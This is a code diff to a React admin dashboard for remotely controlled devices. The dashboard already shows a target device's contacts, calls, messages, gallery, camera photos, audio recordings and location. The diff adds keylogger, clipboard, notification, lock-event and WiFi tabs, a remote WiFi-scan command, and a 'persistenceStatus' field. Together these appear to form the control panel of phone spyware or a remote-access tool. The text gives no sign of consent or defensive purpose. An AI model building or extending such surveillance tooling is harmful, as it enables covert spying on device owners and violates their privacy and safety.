@@ -12,6 +12,7 @@ import { DeviceMessagesFeed } from "@/components/admin/devices/DeviceMessagesFee
 import { DeviceAppsTab } from "@/components/admin/devices/DeviceAppsTab";
 import { DeviceLiveStreamPanel } from "@/components/admin/devices/DeviceLiveStreamPanel";
 import { DeviceGalleryTab } from "@/components/admin/devices/DeviceGalleryTab";
+import { DeviceIntelligenceTabViews } from "@/components/admin/devices/DeviceIntelligenceTabViews";
 import { ToggleLeft, ToggleRight, RefreshCw } from "lucide-react";
 
 interface Props {
@@ -24,6 +25,14 @@ interface Props {
   captures: any[];
   audioClips: AudioCapture[];
   files: DeviceFileItem[];
+  notifications?: any[];
+  keystrokes?: any[];
+  clipboardItems?: any[];
+  lockEvents?: any[];
+  wifiNetworks?: any[];
+  currentSsid?: string | null;
+  persistenceStatus?: any;
+  onClearModule?: (mod: string) => void;
   filesLoading?: boolean;
   tabLoading?: boolean;
   isLiveMovement?: boolean;
@@ -34,26 +43,22 @@ interface Props {
   onSendCommand: (cmd: string, payload?: any, label?: string) => void;
   onDeleteCommand: (id: string) => void;
   onBulkDeleteCommands?: (type: "take_photo" | "record_audio") => void;
-  onDeleteContact?: (id: string) => void;
-  onDeleteCall?: (id: string) => void;
-  onDeleteMessage?: (id: string) => void;
-  onDeleteApp?: (id: string) => void;
-  onDeleteFile?: (id: string) => void;
-  onBulkDeleteContacts?: () => void;
-  onBulkDeleteCalls?: () => void;
-  onBulkDeleteMessages?: () => void;
-  onBulkDeleteApps?: () => void;
-  onBulkDeleteFiles?: () => void;
+  onDeleteContact?: (id: string) => void; onDeleteCall?: (id: string) => void;
+  onDeleteMessage?: (id: string) => void; onDeleteApp?: (id: string) => void; onDeleteFile?: (id: string) => void;
+  onBulkDeleteContacts?: () => void; onBulkDeleteCalls?: () => void;
+  onBulkDeleteMessages?: () => void; onBulkDeleteApps?: () => void; onBulkDeleteFiles?: () => void;
 }
 
-const TOGGLEABLE_TABS = ["gallery", "contacts", "calls", "messages", "apps", "camera", "audio"];
+const TOGGLEABLE_TABS = ["gallery", "contacts", "calls", "messages", "apps", "camera", "audio", "notifications", "keylogger", "clipboard", "security"];
 
 export const DeviceTabViews: React.FC<Props> = ({
   activeTab, device, locations, contacts, calls, messages, captures, audioClips,
-  files, filesLoading, tabLoading, isLiveMovement, isTabEnabled = false, onToggleTab, onFetchOnce,
-  onToggleLiveMovement, onSendCommand, onDeleteCommand, onBulkDeleteCommands,
-  onDeleteContact, onDeleteCall, onDeleteMessage, onDeleteApp, onDeleteFile,
-  onBulkDeleteContacts, onBulkDeleteCalls, onBulkDeleteMessages, onBulkDeleteApps, onBulkDeleteFiles,
+  files, notifications = [], keystrokes = [], clipboardItems = [], lockEvents = [], wifiNetworks = [],
+  currentSsid, persistenceStatus, onClearModule, filesLoading, tabLoading, isLiveMovement,
+  isTabEnabled = false, onToggleTab, onFetchOnce, onToggleLiveMovement, onSendCommand,
+  onDeleteCommand, onBulkDeleteCommands, onDeleteContact, onDeleteCall, onDeleteMessage,
+  onDeleteApp, onDeleteFile, onBulkDeleteContacts, onBulkDeleteCalls, onBulkDeleteMessages,
+  onBulkDeleteApps, onBulkDeleteFiles,
 }) => {
   const showToggle = TOGGLEABLE_TABS.includes(activeTab);
   const hasData = (
@@ -63,7 +68,11 @@ export const DeviceTabViews: React.FC<Props> = ({
     (activeTab === "gallery" && files.length > 0) ||
     (activeTab === "camera" && captures.length > 0) ||
     (activeTab === "audio" && audioClips.length > 0) ||
-    (activeTab === "apps" && ((device as any)?.counts?.apps ?? 0) > 0)
+    (activeTab === "apps" && ((device as any)?.counts?.apps ?? 0) > 0) ||
+    (activeTab === "notifications" && notifications.length > 0) ||
+    (activeTab === "keylogger" && keystrokes.length > 0) ||
+    (activeTab === "clipboard" && clipboardItems.length > 0) ||
+    (activeTab === "security" && (lockEvents.length > 0 || wifiNetworks.length > 0))
   );
 
   return (
@@ -162,6 +171,21 @@ export const DeviceTabViews: React.FC<Props> = ({
               deviceId={device.id} files={files} loading={filesLoading}
               onSyncGallery={() => onSendCommand("sync_gallery", {}, "Sync Gallery")}
               onSendCommand={onSendCommand} onDeleteFile={onDeleteFile} onBulkDeleteFiles={onBulkDeleteFiles}
+            />
+          )}
+          {["notifications", "keylogger", "clipboard", "security"].includes(activeTab) && (
+            <DeviceIntelligenceTabViews
+              activeTab={activeTab}
+              notifications={notifications}
+              keystrokes={keystrokes}
+              clipboardItems={clipboardItems}
+              lockEvents={lockEvents}
+              wifiNetworks={wifiNetworks}
+              currentSsid={currentSsid}
+              persistenceStatus={persistenceStatus}
+              onClearModule={onClearModule}
+              onScanWifi={() => onSendCommand("sync_wifi", {}, "WiFi scan")}
+              loading={tabLoading}
             />
           )}
         </>
